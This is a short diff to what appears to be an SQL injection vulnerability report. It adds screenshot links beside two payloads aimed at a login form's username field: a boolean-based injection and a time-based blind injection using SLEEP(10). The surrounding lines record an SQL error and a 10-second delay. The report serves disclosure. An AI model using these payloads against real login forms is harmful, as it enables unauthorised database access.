@@ -34,6 +34,8 @@ username=1'+OR+NOT+1207%3D1206%23&password=2
 
 An error occurred in the sql statement
 
+![image](https://github.com/saintone98/picture/blob/main/error.png)
+
 Payload2: username=1'+AND+(SELECT+2+FROM+(SELECT(SLEEP(10)))a)--+b&password=2
 
 ```
@@ -62,5 +64,5 @@ username=1'+AND+(SELECT+2+FROM+(SELECT(SLEEP(10)))a)--+b&password=2
 
 The server's response time is 10 seconds
 
-
+![image](https://github.com/saintone98/picture/blob/main/tenSec.png)
 
